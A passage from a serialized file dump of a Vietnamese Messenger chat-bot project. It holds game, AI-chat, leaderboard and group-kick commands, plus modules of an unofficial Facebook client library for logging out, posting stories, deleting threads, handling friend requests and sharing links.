if (!game) return api.sendMessage(\"‚ùå Kh√¥ng c√≥ game n√†o ƒë·ªÉ r·ªùi!\", threadID, messageID);\n\n    const isRedPlayer = game.redPlayer && game.redPlayer.id === senderID;\n    const isBlackPlayer = game.blackPlayer && game.blackPlayer.id === senderID;\n    const isCreator = game.creator === senderID;\n\n    if (!isRedPlayer && !isBlackPlayer && !isCreator) return api.sendMessage(\"‚ùå B·∫°n kh√¥ng c√≥ trong game n√†y!\", threadID, messageID);\n\n    let message = \"\";\n\n    if (game.status === \"waiting\") {\n        if (isRedPlayer) {\n            game.redPlayer = null;\n            message = \"‚ùå Ng∆∞·ªùi ch∆°i ƒë·ªè ƒë√£ r·ªùi game!\";\n        } else if (isBlackPlayer) {\n            game.blackPlayer = null;\n            message = \"‚ùå Ng∆∞·ªùi ch∆°i ƒëen ƒë√£ r·ªùi game!\";\n        }\n\n        if (isCreator) {\n            global.coTuong.delete(threadID);\n            message = \"‚ùå Ng∆∞·ªùi t·∫°o game ƒë√£ r·ªùi! Game b·ªã h·ªßy!\";\n        }\n    } else if (game.status === \"playing\") {\n        const leaverName = isRedPlayer ? game.redPlayer.name : \n                          isBlackPlayer ? game.blackPlayer.name : \"Ng∆∞·ªùi t·∫°o\";\n        const winnerName = isRedPlayer ? game.blackPlayer.name : \n                          isBlackPlayer ? game.redPlayer.name : \"C√≤n l·∫°i\";\n        const leaverSymbol = isRedPlayer ? \"üî¥\" : \"‚ö´\";\n        const winnerSymbol = isRedPlayer ? \"‚ö´\" : \"üî¥\";\n\n        message = `üíî ${leaverName} ${leaverSymbol} ƒë√£ r·ªùi game v√† b·ªã x·ª≠ THUA!\\nüèÜ ${winnerName} ${winnerSymbol} TH·∫ÆNG!`;\n\n        global.coTuong.delete(threadID);\n    }\n\n    return api.sendMessage(message, threadID, messageID);\n}\n\nasync function endGame(api, threadID, messageID, senderID) {\n    const game = global.coTuong.get(threadID);\n\n    if (!game) return api.sendMessage(\"‚ùå Kh√¥ng c√≥ game n√†o ƒë·ªÉ k·∫øt th√∫c!\", threadID, messageID);\n    if (game.status !== \"playing\") return api.sendMessage(\"‚ùå Game ch∆∞a b·∫Øt ƒë·∫ßu!\", threadID, messageID);\n\n    const isRedPlayer = game.redPlayer && game.redPlayer.id === senderID;\n    const isBlackPlayer = game.blackPlayer && game.blackPlayer.id === senderID;\n\n    if (!isRedPlayer && !isBlackPlayer) return api.sendMessage(\"‚ùå Ch·ªâ ng∆∞·ªùi ch∆°i m·ªõi c√≥ th·ªÉ vote k·∫øt th√∫c game!\", threadID, messageID);\n\n    game.endVotes = game.endVotes || new Set();\n\n    if (game.endVotes.has(senderID)) {\n        const playerName = isRedPlayer ? game.redPlayer.name : game.blackPlayer.name;\n        return api.sendMessage(`‚ùå ${playerName} ƒë√£ ƒë·ªÅ xu·∫•t k·∫øt th√∫c r·ªìi! ƒêang ch·ªù ng∆∞·ªùi kia ph·∫£n h·ªìi...`, threadID, messageID);\n    }\n\n    game.endVotes.add(senderID);\n\n    const playerName = isRedPlayer ? game.redPlayer.name : game.blackPlayer.name;\n    const otherPlayerName = isRedPlayer ? game.blackPlayer.name : game.redPlayer.name;\n\n    if (game.endVotes.size >= 2) {\n        let message = \"üèÅ GAME K·∫æT TH√öC!\\n\\nüìä K·∫øt qu·∫£: H√≤a (C·∫£ 2 ng∆∞·ªùi ƒë·ªìng √Ω k·∫øt th√∫c)\\n\";\n        if (game.redPlayer) message += `üî¥ ${game.redPlayer.name}\\n`;\n        if (game.blackPlayer) message += `‚ö´ ${game.blackPlayer.name}\\n`;\n        message += \"\\nüí≠ C·∫£m ∆°n c√°c b·∫°n ƒë√£ ch∆°i!\";\n\n        global.coTuong.delete(threadID);\n        return api.sendMessage(message, threadID, messageID);\n    } else {\n        return api.sendMessage(`ü§ù ${playerName} ƒë·ªÅ xu·∫•t k·∫øt th√∫c game v·ªõi k·∫øt qu·∫£ h√≤a!\n\n‚ùì ${otherPlayerName}, b·∫°n c√≥ ƒë·ªìng √Ω k·∫øt th√∫c kh√¥ng?\n‚Ä¢ Nh·∫≠p \"${module.exports.config.name} end\" ƒë·ªÉ ƒë·ªìng √Ω\n‚Ä¢ Ti·∫øp t·ª•c ch∆°i b√¨nh th∆∞·ªùng ƒë·ªÉ t·ª´ ch·ªëi\n\n‚è≥ ƒêang ch·ªù ph·∫£n h·ªìi t·ª´ ${otherPlayerName}...`, threadID, messageID);\n    }\n}\n\nasync function surrender(api, threadID, messageID, senderID) {\n    const game = global.coTuong.get(threadID);\n\n    if (!game) return api.sendMessage(\"‚ùå Kh√¥ng c√≥ game n√†o!\", threadID, messageID);\n    if (game.status !== \"playing\") return api.sendMessage(\"‚ùå Game ch∆∞a b·∫Øt ƒë·∫ßu!\", threadID, messageID);\n\n    const isRedPlayer = game.redPlayer && game.redPlayer.id === senderID;\n    const isBlackPlayer = game.blackPlayer && game.blackPlayer.id === senderID;\n\n    if (!isRedPlayer && !isBlackPlayer) return api.sendMessage(\"‚ùå B·∫°n kh√¥ng ph·∫£i ng∆∞·ªùi ch∆°i!\", threadID, messageID);\n\n    const surrendererName = isRedPlayer ? game.redPlayer.name : game.blackPlayer.name;\n    const winnerName = isRedPlayer ? game.blackPlayer.name : game.redPlayer.name;\n    const surrendererSymbol = isRedPlayer ? \"üî¥\" : \"‚ö´\";\n    const winnerSymbol = isRedPlayer ? \"‚ö´\" : \"üî¥\";\n\n    const message = `üè≥Ô∏è ${surrendererName} ${surrendererSymbol} ƒë·∫ßu h√†ng!\nüèÜ ${winnerName} ${winnerSymbol} TH·∫ÆNG!\n\nüéÆ Game k·∫øt th√∫c!`;\n\n    global.coTuong.delete(threadID);\n    return api.sendMessage(message, threadID, messageID);\n}","path":null,"size_bytes":28129,"size_tokens":null},"modules/commands/catai.js":{"content":"const axios = require('axios'); \nconst fs = require('fs');\nconst path = require('path');\n\nmodule.exports.config = {\n    name: \"catai\",\n    version: \"1.1.1\",\n    hasPermssion: 0,\n    credits: \"TatsuYTB\",\n    description: \"Chat v·ªõi Cat AI\",\n    commandCategory: \"AI\",\n    usages: \"catai n·ªôi dung\",\n    cooldowns: 10,\n};\n\nconst getApiUrl = () => {\n    try {\n        const filePath = path.join(__dirname, '/data/api.json');\n        const data = fs.readFileSync(filePath, 'utf-8');\n        const jsonData = JSON.parse(data);\n\n        if (!jsonData.catai || jsonData.catai.trim() === '') {\n            return null;\n        }\n        return jsonData.catai;\n    } catch {\n        return null;\n    }\n};\n\nconst getChatResponse = async (text) => {\n    const apiUrl = getApiUrl();\n    if (!apiUrl) {\n        throw new Error(\"ƒêang c·∫≠p nh·∫≠t!!!\");\n    }\n\n    for (let uid = 1; uid <= 9; uid++) {\n        try {\n            const response = await axios.get(`${apiUrl}?prompt=${encodeURIComponent(text)}&uid=${uid}`);\n            if (response.data && response.data.result) {\n                return response.data.result;\n            }\n        } catch {\n            continue;\n        }\n    }\n\n    throw new Error(\"T·∫•t c·∫£ c√°c UID ƒë·ªÅu kh√¥ng ph·∫£n h·ªìi, vui l√≤ng th·ª≠ l·∫°i sau.\");\n};\n\nconst chatSessions = {};\n\nmodule.exports.run = async ({ api, event, args }) => {\n    try {\n        const text = args.join(' ');\n        if (!text) {\n            return api.sendMessage('Vui l√≤ng cung c·∫•p n·ªôi dung ƒë·ªÉ chat v·ªõi AI.', event.threadID, event.messageID);\n        }\n\n        const response = await getChatResponse(text);\n\n        const messageID = await new Promise((resolve, reject) => {\n            api.sendMessage(response, event.threadID, (error, info) => {\n                if (error) return reject(error);\n                resolve(info.messageID);\n            }, event.messageID);\n        });\n\n        chatSessions[messageID] = event.threadID;\n    } catch (error) {\n        api.sendMessage(error.message, event.threadID, event.messageID);\n    }\n};\n\nmodule.exports.handleReply = async ({ api, event }) => {\n    try {\n        const sessionThreadID = chatSessions[event.messageReply.messageID];\n\n        if (sessionThreadID && sessionThreadID === event.threadID) {\n            const text = event.body;\n            const response = await getChatResponse(text);\n\n            const messageID = await new Promise((resolve, reject) => {\n                api.sendMessage(response, event.threadID, (error, info) => {\n                    if (error) return reject(error);\n                    resolve(info.messageID);\n                }, event.messageID);\n            });\n\n            chatSessions[messageID] = event.threadID;\n            delete chatSessions[event.messageReply.messageID];\n        }\n    } catch (error) {\n        api.sendMessage(error.message, event.threadID, event.messageID);\n    }\n};\n\nmodule.exports.handleEvent = async function ({ api, event }) {\n    if (event.type === \"message_reply\") {\n        await this.handleReply({ api, event });\n    }\n};\n\nmodule.exports.languages = {\n    \"vi\": {\n        \"description\": \"Chat v·ªõi AI th√¥ng qua API\"\n    }\n};\n","path":null,"size_bytes":3164,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/logout.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function logout(callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, friendList) {\n        if (err) return rejectFunc(err);\n\n        resolveFunc(friendList);\n      };\n    }\n\n    var form = {\n      pmid: \"0\"\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/bluebar/modern_settings_menu/?help_type=364455653583099&show_contextual_help=1\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        var elem = resData.jsmods.instances[0][2][0].filter(function (v) {\n          return v.value === \"logout\";\n        })[0];\n\n        var html = resData.jsmods.markup.filter(function (v) {\n          return v[0] === elem.markup.__m;\n        })[0][1].__html;\n\n        var form = {\n          fb_dtsg: utils.getFrom(html, '\"fb_dtsg\" value=\"', '\"'),\n          ref: utils.getFrom(html, '\"ref\" value=\"', '\"'),\n          h: utils.getFrom(html, '\"h\" value=\"', '\"')\n        };\n\n        return defaultFuncs\n          .post(\"https://www.facebook.com/logout.php\", ctx.jar, form)\n          .then(utils.saveCookies(ctx.jar));\n      })\n      .then(function (res) {\n        if (!res.headers) throw { error: \"An error occurred when logging out.\" };\n\n        return defaultFuncs\n          .get(res.headers.location, ctx.jar)\n          .then(utils.saveCookies(ctx.jar));\n      })\n      .then(function () {\n        ctx.loggedIn = false;\n        log.info(\"logout\", \"Logged out successfully.\");\n        callback();\n      })\n      .catch(function (err) {\n        log.error(\"logout\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1959,"size_tokens":null},"lib/fca-auto/src/postStory.js":{"content":"\"use strict\";\n\nconst utils = require(\"../utils\");\nconst log = require(\"npmlog\");\nconst fs = require(\"fs-extra\");\n\nmodule.exports = function(defaultFuncs, api, ctx) {\n  /**\n   * Post story ƒë∆°n gi·∫£n ch·ªâ c·∫ßn truy·ªÅn v√†o attachment\n   * @param {Object} attachment - File attachment (stream/buffer)\n   * @param {Object} options - C√°c t√πy ch·ªçn b·ªï sung\n   * @returns {Promise}\n   */\n  function postStory(attachment, options = {}) {\n    return new Promise(async (resolve, reject) => {\n      try {\n        // Validate attachment\n        if (!attachment) {\n          throw new Error('Attachment is required');\n        }\n\n        let attachmentData;\n        if (Buffer.isBuffer(attachment)) {\n          // N·∫øu l√† buffer th√¨ t·∫°o stream t·ª´ buffer\n          attachmentData = attachment;\n        } else if (typeof attachment === 'string' && fs.existsSync(attachment)) {\n          // N·∫øu l√† ƒë∆∞·ªùng d·∫´n file\n          attachmentData = fs.createReadStream(attachment);\n        } else if (attachment.readable) {\n          // N·∫øu ƒë√£ l√† stream\n          attachmentData = attachment;\n        } else {\n          throw new Error('Invalid attachment type');\n        }\n\n        // Form data c∆° b·∫£n\n        const form = {\n          file: attachmentData,\n          voice_clip: 'true',\n          story_status: options.caption || \"\",\n          audience: JSON.stringify({\n            privacy: {\n              allow: options.allowList || [],\n              deny: options.denyList || [],\n              order: options.privacyOrder || [],\n              base_state: options.privacy || \"EVERYONE\"\n            }\n          })\n        };\n\n        // Upload attachment l√™n Facebook\n        const response = await defaultFuncs\n          .postFormData(\"https://upload.facebook.com/ajax/mercury/upload.php\", ctx.jar, form)\n          .then(utils.parseAndCheckLogin(ctx, defaultFuncs));\n\n        if (!response || response.error) {\n          throw response.error || new Error('Failed to upload attachment');\n        }\n\n        // L·∫•y metadata t·ª´ response\n        const metadata = response.payload.metadata[0];\n        \n        // Chu·∫©n b·ªã data cho story\n        const storyData = {\n          input: {\n            message: {\n              text: options.caption || \"\",\n              ranges: []\n            },\n            source: options.source || \"MOBILE\",\n            audiences: {\n              stories: [{\n                \"privacy_data\": {\n                  \"privacy_state\": options.privacy || \"EVERYONE\",\n                  \"allow\": options.allowList || [],\n                  \"deny\": options.denyList || []\n                }\n              }]\n            },\n            attachments: [{\n              \"photo\": metadata.photo_id ? {\n                \"id\": metadata.photo_id,\n                \"can_viewer_edit\": true\n              } : null,\n              \"video\": metadata.video_id ? {\n                \"id\": metadata.video_id,\n                \"can_viewer_edit\": true\n              } : null,\n            }],\n            actor_id: ctx.userID,\n            client_mutation_id: ctx.clientMutationId++\n          }\n        };\n\n        // Post story\n        const storyResponse = await defaultFuncs\n          .post(\"https://www.facebook.com/api/graphql/\", ctx.jar, {\n            doc_id: \"2421899371426364\", // Story creation doc_id\n            variables: JSON.stringify(storyData)\n          })\n          .then(utils.parseAndCheckLogin(ctx, defaultFuncs));\n\n        if (!storyResponse || storyResponse.error) {\n          throw storyResponse.error || new Error('Failed to post story');\n        }\n\n        resolve({\n          success: true,\n          story_id: storyResponse.data?.story_create?.story?.id,\n          story_url: storyResponse.data?.story_create?.story?.url,\n          timestamp: Date.now()\n        });\n\n      } catch (error) {\n        log.error(\"postStory\", error);\n        reject(error);\n      }\n    });\n  }\n\n  return postStory;\n};","path":null,"size_bytes":3931,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/deleteThread.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function deleteThread(threadOrThreads, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n    if (!callback) {\n      callback = function (err) {\n        if (err) return rejectFunc(err);\n        resolveFunc();\n      };\n    }\n\n    var form = {\n      client: \"mercury\"\n    };\n\n    if (utils.getType(threadOrThreads) !== \"Array\") threadOrThreads = [threadOrThreads];\n    for (var i = 0; i < threadOrThreads.length; i++) form[\"ids[\" + i + \"]\"] = threadOrThreads[i];\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/ajax/mercury/delete_thread.php\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"deleteThread\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1186,"size_tokens":null},"modules/commands/du.js":{"content":"module.exports.config = {\n  name: \"d√∫\",\n  version: \"2.0.0\",\n  hasPermssion: 0,\n  credits: \"Vtuan\",\n  description: \"Xem ·∫£nh\",\n  commandCategory: \"Random-img\",\n  usages: \"\",\n  cooldowns: 30\n};\n\nmodule.exports.run = async function({ api, event, args }) {\n    return api.sendMessage((\"d√∫ c√°i l ra web segs m√† xem:)\"), event.threadID);\n}","path":null,"size_bytes":338,"size_tokens":null},"modules/commands/top.js":{"content":"const moment = require('moment-timezone');\n\nmodule.exports.config = {\n    name: \"top\",\n    version: \"1.1.1\",\n    credits: \"DC-Nam\",\n    hasPermssion: 0,\n    description: \"Xem top money ·ªü trong box ho·∫∑c server\",\n    usages: \"[boxmoney|svmoney] + ƒë·ªô d√†i list (m·∫∑c ƒë·ªãnh l√† 10)\",\n    commandCategory: \"Ti·ªán √≠ch\",\n    cooldowns: 5\n};\n\nmodule.exports.run = async function({ api, event, args, Currencies, Users }) {\n    const { threadID: t, messageID: m, senderID: s, participantIDs: pI } = event;\n    let arr = [], newArr = [], msg = \"\", type = args[0], leng = parseInt(args[1]) - 1 || 9;\n    const allType = [\"boxmoney\", \"svmoney\"];\n    if (!allType.includes(type)) return api.sendMessage(`>>>ùêÇùêáùêÑùêÇùêäùêìùêéùêè<<<\\n-> #ùê≠ùê®ùê© ùêõùê®ùê±ùê¶ùê®ùêßùêûùê≤: ùê±ùêûùê¶ ùê≠ùê®ùê© ùê¶ùê®ùêßùêûùê≤ ùê≠ùê´ùê®ùêßùê† ùêßùê°ùê®ÃÅùê¶\\n-> #ùê≠ùê®ùê© ùê¨ùêØùê¶ùê®ùêßùêûùê≤: ùê±ùêûùê¶ ùê≠ùê®ùê© ùê¶ùê®ùêßùêûùê≤ ùê¨ùêûùê´ùêØùêûùê´`, t, m);\n    if (isNaN(leng) && leng) return api.sendMessage(`‚ûù ùêÉùê®Ã£ÃÇ ùêùùêöÃÄùê¢ ùê•ùê¢ùê¨ùê≠ ùê©ùê°ùêöÃâùê¢ ùê•ùêöÃÄ ùüè ùêúùê®ùêß ùê¨ùê®ÃÇÃÅ`, t, m);\n\n    switch (type) {\n        case \"boxmoney\": {\n            for (const id of pI) {\n                let data = await Currencies.getData(id);\n                if (!data) continue;\n                let money = data.money || 0;\n                arr.push({ id: id, money: money });\n            }\n            arr.sort((a, b) => b.money - a.money);\n            newArr = arr.slice(0, leng + 1);\n            msg = `=== [ ùêìùêéùêè ùüèùüé ùêçùêÜùêîÃõùêéÃõÃÄùêà ùêÜùêàùêÄÃÄùêî ] ===\\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\n`.toUpperCase();\n            for (let i = 0; i < newArr.length; i++) {\n                let name = (await Users.getData(newArr[i].id)).name || \"\";\n                msg += `${i < 4 ? ICON(i) : `${i+1}.`} ${name}\\n‚Üí ùêåùêéùêçùêÑùêò: ${CC(newArr[i].money)}$\\n`;\n            }\n            let find = newArr.find(i => i.id == s);\n            if (find) msg += TX(\"money\", find.stt, find.money);\n            api.sendMessage(msg, t, m);\n        }\n        break;\n\n        case \"svmoney\": {\n            let get = await Currencies.getAll(['userID', 'money']);\n            get.sort((a, b) => b.money - a.money);\n            arr = get.slice(0, leng + 1).map((item, index) => ({ stt: index + 1, id: item.userID, money: item.money }));\n            msg = `=== [ ùêìùêéùêè ùüèùüé ùêçùêÜùêîÃõùêéÃõÃÄùêà ùêÜùêàùêÄÃÄùêî] ===\\n‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\n`.toUpperCase();\n            for (let i = 0; i < arr.length; i++) {\n                let name = (await Users.getData(arr[i].id)).name || \"\";\n                msg += `${i < 4 ? ICON(i) : `${i+1}.`} ${name}\\n‚Üí ùêåùêéùêçùêÑùêò: ${CC(arr[i].money)}$\\n`;\n            }\n            let find = arr.find(i => i.id == s);\n            if (find) msg += TX(\"money\", find.stt, find.money);\n            api.sendMessage(msg, t, m);\n        }\n        break;\n    }\n};\n\nfunction CC(n) {\n    return n.toLocaleString('en-US', { minimumFractionDigits: 2 });\n}\n\nfunction ICON(i) {\n    return i == 0 ? \"üèÜ\" : i == 1 ? \"ü•á\" : i == 2 ? \"ü•à\" : i == 3 ? \"ü•â\" : \"\";\n}\n\nfunction TX(tx, i, x) {\n    return `‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ\\n${i >= 11 ? `‚Üí ùêÅùêöÃ£ùêß ùêùùêÆÃõÃÅùêßùê† ùê≠ùê°ùêÆÃõÃÅ: ${i}\\n‚ûù ${tx == \"money\" ? `ùêåùêéùêçùêÑùêò: ${CC(x)}$` : `ùêãùêûùêØùêûùê•: ${LV(x)}`}` : i >= 1 && i <= 4 ? \"‚Üí ùêÅùêöÃ£ùêß ùê°ùê¢ùêûÃ£ÃÇùêß ùêùùêöùêßùê† ùêúùê®ÃÅ ùê¶ùêöÃ£ÃÜùê≠ ùê≠ùê´ùê®ùêßùê† ùêìùêéùêè\" : i == 0 ? \"‚ûù ùêáùê¢ùêûÃ£ÃÇùêß ùê≠ùêöÃ£ùê¢ ùêõùêöÃ£ùêß ùê•ùêöÃÄ ùêßùê†ùêÆÃõùê®ÃõÃÄùê¢ ùêùùêÆÃõÃÅùêßùê† ùêìùêéùêè ùêùùêöÃÇÃÄùêÆ \" : \"‚Üí ùêáùê¢ùêûÃ£ÃÇùêß ùê≠ùêöÃ£ùê¢ ùêõùêöÃ£ùêß ùêùùêöùêßùê† ùêùùêÆÃõÃÅùêßùê† ùê≠ùê´ùê®ùêßùê† ùêìùêéùêè ùüèùüé\"}`;\n}\n","path":null,"size_bytes":3963,"size_tokens":null},"lib/fca-auto/src/handleFriendRequest.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function handleFriendRequest(userID, accept, callback) {\n    if (utils.getType(accept) !== \"Boolean\") throw { error: \"Please pass a boolean as a second argument.\" };\n\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n        resolveFunc(data);\n      };\n    }\n\n    var form = {\n      viewer_id: userID,\n      \"frefs[0]\": \"jwl\",\n      floc: \"friend_center_requests\",\n      ref: \"/reqs.php\",\n      action: (accept ? \"confirm\" : \"reject\")\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/requests/friends/ajax/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.payload.err) throw { err: resData.payload.err };\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"handleFriendRequest\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1284,"size_tokens":null},"modules/commands/kick.js":{"content":"module.exports.config = {\n    name: \"kick\",\n    version: \"1.1.0\",\n    hasPermssion: 1,\n    credits: \"D-Jukie, edited by ChatGPT\",\n    description: \"Xo√° ng∆∞·ªùi b·∫°n c·∫ßn xo√° kh·ªèi nh√≥m b·∫±ng c√°ch tag ho·∫∑c reply\",\n    commandCategory: \"Qu·∫£n L√≠ Box\",\n    usages: \"[tag/reply/all]\",\n    cooldowns: 0\n};\n\nmodule.exports.run = async function ({\n    args,\n    api,\n    event,\n    Threads\n}) {\n    const { threadID, senderID, messageID } = event;\n    const { participantIDs } = (await Threads.getData(threadID)).threadInfo;\n    const botID = api.getCurrentUserID();\n    const protectedUID = \"100040472494187\";\n\n    try {\n        if (args.join().indexOf('@') !== -1) {\n            const mention = Object.keys(event.mentions);\n            for (let o of mention) {\n                if (o !== protectedUID) {\n                    setTimeout(() => {\n                        return api.removeUserFromGroup(o, threadID);\n                    }, 1000);\n                } else {\n                    api.sendMessage(`Kh√¥ng th·ªÉ kick ng∆∞·ªùi d√πng c√≥ UID: ${protectedUID}`, threadID, messageID);\n                }\n            }\n        } else if (event.type == \"message_reply\") {\n            const uid = event.messageReply.senderID;\n            if (uid !== protectedUID) {\n                return api.removeUserFromGroup(uid, threadID);\n            } else {\n                return api.sendMessage(`Kh√¥ng th·ªÉ kick ng∆∞·ªùi d√πng c√≥ UID: ${protectedUID}`, threadID, messageID);\n            }\n        } else if (args[0] == \"all\") {\n            return api.sendMessage(\n                \"B·∫°n c√≥ ch·∫Øc ch·∫Øn mu·ªën kick to√†n b·ªô th√†nh vi√™n? Reply tin nh·∫Øn n√†y v·ªõi \\\"c√≥\\\" ho·∫∑c \\\"kh√¥ng\\\".\",\n                threadID,\n                (err, info) => {\n                    global.client.handleReply.push({\n                        name: this.config.name,\n                        author: senderID,\n                        threadID,\n                        messageID: info.messageID,\n                        botID\n                    });\n                },\n                messageID\n            );\n        } else {\n            return api.sendMessage(`Vui l√≤ng tag, reply ng∆∞·ªùi mu·ªën kick, ho·∫∑c d√πng \"kick all\" ƒë·ªÉ r√£ box.`, threadID, messageID);\n        }\n    } catch {\n        return api.sendMessage(\"ƒê√£ x·∫£y ra l·ªói!\", threadID, messageID);\n    }\n};\n\nmodule.exports.handleReply = async function ({\n    event,\n    api,\n    handleReply\n}) {\n    const { senderID, threadID, body, messageID } = event;\n    const { author, botID } = handleReply;\n\n    if (senderID !== author) {\n        return api.sendMessage(\"B·∫°n kh√¥ng ph·∫£i ng∆∞·ªùi th·ª±c hi·ªán l·ªánh, kh√¥ng th·ªÉ tr·∫£ l·ªùi x√°c nh·∫≠n!\", threadID, messageID);\n    }\n\n    if (body.toLowerCase() === \"c√≥\") {\n        const threadInfo = await api.getThreadInfo(threadID);\n        const listUserID = threadInfo.participantIDs.filter(\n            (ID) => ID !== botID && ID !== senderID && ID !== \"100040472494187\"\n        );\n\n        for (let idUser of listUserID) {\n            setTimeout(() => {\n                api.removeUserFromGroup(idUser, threadID);\n            }, 5000);\n        }\n\n        return api.sendMessage(\"ƒê√£ kick to√†n b·ªô th√†nh vi√™n (tr·ª´ bot v√† b·∫°n)!\", threadID);\n    } else if (body.toLowerCase() === \"kh√¥ng\") {\n        return api.sendMessage(\"L·ªánh kick all ƒë√£ b·ªã h·ªßy.\", threadID);\n    } else {\n        return api.sendMessage(\"Vui l√≤ng reply v·ªõi \\\"c√≥\\\" ho·∫∑c \\\"kh√¥ng\\\" ƒë·ªÉ x√°c nh·∫≠n.\", threadID, messageID);\n    }\n};\n","path":null,"size_bytes":3539,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/shareLink.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n\treturn async function shareLink(text, url, threadID, callback) {\n\t\tvar resolveFunc = function () { };\n\t\tvar rejectFunc = function () { };\n\t\tvar returnPromise = new Promise(function (resolve, reject) {\n\t\t\tresolveFunc = resolve;\n\t\t\trejectFunc = reject;\n\t\t});\n\t\tif (!callback) {\n\t\t\tcallback = function (err, data) {\n\t\t\t\tif (err) return rejectFunc(err);\n\t\t\t\tresolveFunc(data);\n\t\t\t};\n\t\t}\n\t\tmqttClient.publish('/ls_req',\n\t\t\tJSON.stringify({\n\t\t\t\t\"app_id\": \"2220391788200892\",\n\t\t\t\t\"payload\": JSON.stringify({\n\t\t\t\t\t\ttasks: [{\n\t\t\t\t\t\t\t\tlabel: 46,\n\t\t\t\t\t\t\t\tpayload: JSON.stringify({\n\t\t\t\t\t\t\t\t\t\"otid\": utils.generateOfflineThreadingID(),\n\t\t\t\t\t\t\t\t\t\"source\": 524289,\n\t\t\t\t\t\t\t\t\t\"sync_group\": 1,\n\t\t\t\t\t\t\t\t\t\"send_type\": 6,\n\t\t\t\t\t\t\t\t\t\"mark_thread_read\": 0,\n\t\t\t\t\t\t\t\t\t\"url\": url || \"https://www.facebook.com/Lazic.Kanzu\",\n\t\t\t\t\t\t\t\t\t\"text\": text || \"\",\n\t\t\t\t\t\t\t\t\t\"thread_id\": threadID,\n\t\t\t\t\t\t\t\t\t\"initiating_source\": 0\n\t\t\t\t\t\t\t\t}),\n\t\t\t\t\t\t\t\tqueue_name: threadID,\n\t\t\t\t\t\t\t\ttask_id: Math.random() * 1001 << 0,\n\t\t\t\t\t\t\t\tfailure_count: null,\n\t\t\t\t\t\t}],\n\t\t\t\t\t\tepoch_id: utils.generateOfflineThreadingID(),\n\t\t\t\t\t\tversion_id: '7191105584331330',\n\t\t\t\t}),\n\t\t\t\t\"request_id\": ++ctx.req_ID,\n\t\t\t\t\"type\": 3\n\t\t\t}),\n\t\t\t{\n\t\t\t\tqos: 1,\n\t\t\t\tretain: false,\n\t\t\t}\n\t\t)\n\t\tctx.callback_Task[ctx.req_ID] = new Object({\n            callback,\n            type: \"shareLink\"\n        });\n\t\treturn returnPromise;\n\t};\n};\n","path":null,"size_bytes":1484,"size_tokens":null},"lib/fca-auto/Extra/Security/Base/index.js":{"content":"'use strict';\n  \nconst fs = require('fs-extra');\nconst utils = require('../../../utils');\nconst logger = require('../../../logger');\nconst Step_3 = require('./Step_3');\nconst Database = require(\"../../Database\");\nconst Already_Action = { First: 0, Encode: { Status: false, Data: Array }, Decode: { Status: false,  Data: Array } }; \n\nvar ArrPassWord;\n\nif (!fs.existsSync(process.cwd() + '/Horizon_Database') || !fs.existsSync(process.cwd() + '/Horizon_Database/RandPass.json')) {\n  const crypto = require('crypto');\n  ArrPassWord = Array.from({length: 101}, (_,i) => crypto.randomBytes(5).toString('hex'));\n  if (Database().has('Security')) {\n    Database().delete('Security');\n  }\n  if (!fs.existsSync(process.cwd() + '/Horizon_Database')) {\n    fs.mkdirSync(process.cwd() + '/Horizon_Database');\n  }\n  fs.writeFileSync(process.cwd() + '/Horizon_Database/RandPass.json', JSON.stringify(ArrPassWord, null, 2), 'utf8');\n}\n\nelse {\n  ArrPassWord = JSON.stringify(fs.readFileSync(process.cwd() + '/Horizon_Database/RandPass.json'));\n}\n  \n  /**\n   * It creates a random string of a given length\n   * @param length - The length of the string to be generated.\n   * @returns A string of random characters.\n   */\n\n  function CreateFakeType2(length) {\n    var result           = '';\n    var characters       = 